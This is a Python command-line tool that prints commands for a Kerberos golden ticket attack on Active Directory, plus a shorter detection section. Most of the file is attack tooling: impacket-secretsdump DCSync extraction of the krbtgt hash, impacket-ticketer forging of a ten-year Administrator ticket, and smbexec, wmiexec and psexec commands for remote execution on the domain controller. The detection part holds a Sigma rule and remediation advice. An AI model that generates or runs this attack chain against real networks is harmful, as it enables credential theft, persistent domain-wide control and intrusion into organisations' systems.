#!/usr/bin/env python3
"""Agent tooling for golden ticket attack execution and detection."""

import argparse
import json
import sys


def extract_krbtgt(domain: str, dc_ip: str) -> dict:
    """Generate commands to extract krbtgt hash."""
    return {
        "action": "extract",
        "domain": domain,
        "dc_ip": dc_ip,
        "commands": {
            "dcsync": f"impacket-secretsdump -just-dc-user krbtgt {domain}/admin@{dc_ip}",
            "get_sid": f"crackmapexec ldap {dc_ip} -d {domain} --get-sid",
        },
        "required_data": ["krbtgt_nthash", "domain_sid"],
        "status": "extraction_configured",
    }


def forge_ticket(
    domain: str, domain_sid: str, krbtgt_hash: str, user: str, duration: int = 3650
) -> dict:
    """Generate golden ticket forging commands."""
    return {
        "action": "forge",
        "domain": domain,
        "user": user,
        "duration_days": duration,
        "command": (
            f"impacket-ticketer -nthash {krbtgt_hash} "
            f"-domain-sid {domain_sid} -domain {domain} "
            f"-duration {duration} {user}"
        ),
        "use_ticket": f"export KRB5CCNAME={user}.ccache",
        "status": "forging_configured",
    }


def validate_access(domain: str, dc_ip: str) -> dict:
    """Validate golden ticket access across domain services."""
    return {
        "action": "validate",
        "domain": domain,
        "dc_ip": dc_ip,
        "tests": [
            {
                "service": "SMB",
                "command": "impacket-smbexec -k -no-pass dc01." + domain,
            },
            {
                "service": "WMI",
                "command": "impacket-wmiexec -k -no-pass dc01." + domain,
            },
            {
                "service": "PSEXEC",
                "command": "impacket-psexec -k -no-pass dc01." + domain,
            },
        ],
        "status": "validation_configured",
    }


def detect_golden_ticket(domain: str, dc_ip: str) -> dict:
    """Generate golden ticket detection rules."""
    return {
        "action": "detect",
        "domain": domain,
        "indicators": [
            "TGS without prior AS exchange",
            "TGT lifetime exceeding domain policy",
            "Encryption type mismatch (RC4 vs AES)",
            "Non-existent account in TGT",
        ],
        "sigma_rule": {
            "title": "Golden Ticket Usage Detected",
            "logsource": {"category": "authentication", "product": "windows"},
            "detection": {
                "selection": {"EventID": 4769},
                "filter_normal_as": {"EventID": 4768},
                "condition": "selection and not filter_normal_as",
            },
            "level": "critical",
        },
        "remediation": [
            "Rotate krbtgt password twice (wait replication between rotations)",
            "Monitor for TGS requests without corresponding AS requests",
            "Enable AES-only Kerberos encryption",
        ],
        "status": "detection_configured",
    }


def main() -> None:
    parser = argparse.ArgumentParser(description="Golden ticket attack agent")
    subparsers = parser.add_subparsers(dest="command", help="Available commands")

    extract_p = subparsers.add_parser("extract", help="Extract krbtgt hash")
    extract_p.add_argument("--domain", required=True)
    extract_p.add_argument("--dc-ip", required=True)

    forge_p = subparsers.add_parser("forge", help="Forge golden ticket")
    forge_p.add_argument("--domain", required=True)
    forge_p.add_argument("--domain-sid", required=True)
    forge_p.add_argument("--krbtgt-hash", required=True)
    forge_p.add_argument("--user", default="Administrator")
    forge_p.add_argument("--duration", type=int, default=3650)

    validate_p = subparsers.add_parser("validate", help="Validate access")
    validate_p.add_argument("--domain", required=True)
    validate_p.add_argument("--dc-ip", required=True)

    detect_p = subparsers.add_parser("detect", help="Generate detection rules")
    detect_p.add_argument("--domain", required=True)
    detect_p.add_argument("--dc-ip", required=True)

    args = parser.parse_args()

    if args.command == "extract":
        result = extract_krbtgt(args.domain, args.dc_ip)
    elif args.command == "forge":
        result = forge_ticket(
            args.domain, args.domain_sid, args.krbtgt_hash, args.user, args.duration
        )
    elif args.command == "validate":
        result = validate_access(args.domain, args.dc_ip)
    elif args.command == "detect":
        result = detect_golden_ticket(args.domain, args.dc_ip)
    else:
        parser.print_help()
        sys.exit(1)

    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
